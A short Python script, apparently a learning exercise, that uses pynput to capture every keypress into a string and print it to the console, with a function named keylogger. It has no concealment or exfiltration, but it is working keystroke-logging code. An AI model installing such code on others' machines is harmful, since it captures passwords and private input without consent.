from pynput import keyboard

text = ""

def record_key(key):
    print(key)

    if hasattr(key, "char"):
        print("alphanumérique")
    else:
        print("non")
    global text
    key = str(key).replace("'", "")

    if key == "Key.enter":
        text += "\n"
    elif key == "Key.space":
        text += " "
    elif key == "Key.backspace":
        text = text[:-1]
    elif key == "Key.esc":
        quit()
    else:
        text += key

def keylogger():
    with keyboard.Listener(on_press=record_key) as listener:
        listener.join()

for i in range(10):
    print(f"i : {i}")
listener = keyboard.Listener(on_press=record_key)

listener.start()

listener.join()